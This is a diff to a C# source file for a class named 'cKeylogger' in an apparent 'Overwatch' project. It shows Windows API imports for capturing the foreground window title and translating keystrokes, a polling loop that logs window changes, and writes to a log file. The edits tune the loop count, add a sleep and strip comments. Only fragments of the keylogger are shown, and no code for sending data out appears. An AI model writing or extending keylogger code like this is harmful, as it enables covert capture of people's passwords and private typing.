@@ -3,9 +3,11 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Globalization;
 namespace Overwatch
 {
     class cKeylogger
@@ -16,8 +18,6 @@ namespace Overwatch
         [DllImport("user32.dll")]
         public static extern IntPtr GetForegroundWindow();
 
-        //The HANDLE equivalent is IntPtr
-        //The LPCSTR is string or StringBuilder
         [DllImport("user32.dll")]
         public static extern IntPtr GetWindowText(IntPtr hWnd, StringBuilder textOut, int count);
 
@@ -31,7 +31,7 @@ namespace Overwatch
         static extern uint GetKeyboardLayout(uint idThread);
 
         [DllImport("user32.dll", SetLastError = true)]
-        //[return : MarshalAs(UnmanagedType.AnsiBStr)] just as example
+
         static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, uint dwhkl);
 
         private const int MAX_STRING_BUILDER = 256;
@@ -40,7 +40,7 @@ namespace Overwatch
         private int counter;
         string path;
 
-        public cKeylogger()
+    public cKeylogger()
         {
             counter = 0;
         }
@@ -55,7 +55,7 @@ namespace Overwatch
                 string tempWindowText = "";
                 while (true)
                 {
-                    for (Int32 i = 0; i < 10000; i++)
+                    for (Int32 i = 0; i < 1000; i++)
                     {
                         tempWindowText = getCurrentWindowText();
                         if (lastWindowText != tempWindowText)
@@ -107,6 +107,7 @@ namespace Overwatch
 
                     }
                     writer.Flush();
+                    System.Threading.Thread.Sleep(55);
                 }
             }
         }
